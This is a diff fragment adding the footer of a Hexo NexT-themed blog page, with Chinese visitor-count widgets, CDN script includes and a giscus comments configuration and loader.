+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:01</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<script class="next-config" data-name="giscus" type="application/json">{"enable":true,"repo":"ex7l0it/ex7l0it.github.io","repo_id":"R_kgDOJOCRMg","category":"R_kgDOJOCRMg","category_id":"DIC_kwDOJOCRMs4CbF3g","mapping":"pathname","reactions_enabled":1,"emit_metadata":1,"theme":"preferred-color-scheme","lang":"zh-CN","crossorigin":"anonymous","input_position":"top","loading":"lazy"}</script>
+
+<script>
+document.addEventListener('page:loaded', () => {
+  if (!CONFIG.page.comments) return;
+
+  NexT.utils.loadComments('.giscus-container')
+    .then(() => NexT.utils.getScript('https://giscus.app/client.js', {
+      attributes: {
+        async                   : true,
+        crossOrigin             : 'anonymous',
+        'data-repo'             : CONFIG.giscus.repo,
+        'data-repo-id'          : CONFIG.giscus.repo_id,
+        'data-category'         : CONFIG.giscus.category,
+        'data-category-id'      : CONFIG.giscus.category_id,
+        'data-mapping'          : CONFIG.giscus.mapping,
+        'data-reactions-enabled': CONFIG.giscus.reactions_enabled,
+        'data-emit-metadata'    : CONFIG.giscus.emit_metadata,
+        'data-theme'            : CONFIG.giscus.theme,
+        'data-lang'             : CONFIG.giscus.lang,
+        'data-input-position'   : CONFIG.giscus.input_position,
+        'data-loading'          : CONFIG.giscus.loading
+      },
+      parentNode: document.querySelector('.giscus-container')
+    }));
+});
+</script>
+
+
+
+
+  
+  <script src="https://cdn.staticfile.org/jquery/3.7.0/jquery.min.js"></script>
+  
+  <script src="/js/outdate.js"></script>
+
+
+
+
+
+</body>
+</html>
